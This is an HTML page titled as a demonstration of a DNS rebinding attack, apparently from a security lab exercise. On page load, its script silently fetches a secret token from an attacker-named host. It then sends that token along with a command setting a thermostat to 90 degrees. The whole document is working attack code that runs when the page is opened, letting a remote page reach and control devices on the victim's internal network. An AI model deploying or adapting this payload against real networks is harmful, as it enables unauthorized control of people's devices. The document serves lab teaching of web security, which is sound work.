<html>
<body>
<h1>Demonstration of DNS Rebinding Attack</h1>
<script>
var secret = 0;

function set_temperature() {
  var sendurl= "http://www.attacker32.com:8000/settemperature?" + 
         "temp=90&" + "secret="+secret;
  var Ajax=new XMLHttpRequest();
  Ajax.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
    }
  };

  Ajax.open("GET", sendurl, true);
  Ajax.send();
}

function get_secret() {
  //var sendurl= "http://www.attacker32.com:8000/getsecret";
  var sendurl= "http://www.attacker33.com:8000/getsecret";
  var Ajax=new XMLHttpRequest();
  Ajax.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      secret = this.responseText;
    }
  };

  Ajax.open("GET", sendurl, true);
  Ajax.send();
}

//window.onload = get_secret();
get_secret();
setTimeout(set_temperature, 3000);
</script>

</body>
<html>
